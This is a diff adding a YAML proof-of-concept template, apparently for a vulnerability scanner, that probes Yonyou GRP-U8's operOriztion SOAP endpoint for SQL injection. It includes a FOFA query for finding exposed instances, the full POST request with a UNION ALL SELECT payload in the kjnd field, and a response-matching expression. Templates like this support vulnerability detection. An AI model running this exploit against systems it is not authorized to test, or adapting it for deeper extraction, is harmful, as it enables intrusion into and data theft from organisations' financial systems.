@@ -1,0 +1,38 @@
+id: poc-yaml-yongyou-grp-u8-operoriztion-sqli
+info:
+  name: 用友GRP-U8 operOriztion SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /services/operOriztion
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+    SOAPAction: ''
+  data: '<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+
+    <kjnd xsi:type="xsd:string">'' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{.t1}}''))--
+    </kjnd>
+
+    </wsdd:getGsbmfaByKjnd>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>'
+  expression: status_code == 200 && contains(body,"</getGsbmfaByKjndReturn>") && contains(body,t2)
+    && contains(content_type,"text/xml")
+transport: http
